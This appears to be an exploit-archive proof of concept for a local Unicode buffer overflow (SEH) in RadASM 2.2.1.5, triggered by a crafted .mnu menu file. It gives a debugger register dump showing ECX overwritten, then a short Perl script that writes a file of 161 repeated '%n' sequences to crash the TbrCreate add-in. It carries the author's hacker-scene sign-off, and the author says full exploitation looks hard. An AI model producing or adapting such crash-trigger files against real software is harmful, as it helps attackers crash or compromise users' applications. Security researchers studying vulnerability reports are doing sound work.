
=============================================================================
[»] RadASM 2.2.1.5 (.mnu File) Local Unicode Overflow Poc (SEH)
[»] By :  SkuLL-HacKeR
[»] Email : My@Hotmail.iT<mailto:My@Hotmail.iT> & Wizard-skh@hotmail.com<mailto:Wizard-skh@hotmail.com>
[»] Note : Hacker R0x Lamerz S3 x
=============================================================================
# EAX 00002E2E
# ECX 41413D92 ECX overwrited
# EDX 00000002
# EBX 00000000
# ESP 0013F894
# EBP 0013F9AC ASCII "..................................................................."
# ESI 00187658 ASCII "%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n"
# EDI 0013FFFE
# EIP 0040171A TbrCreat.0040171A
# directory app
# C:\Documents and Settings\Administrateur\Bureau\aRadASM\AddIns\TbrCreate.exe
# i think is hard to exploit maybe anyone can exploit it :d
my $unicode="%n" x 161;
my $file="xpl.mnu";
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $unicode ;
close($FILE);
print "$file has been created \n";
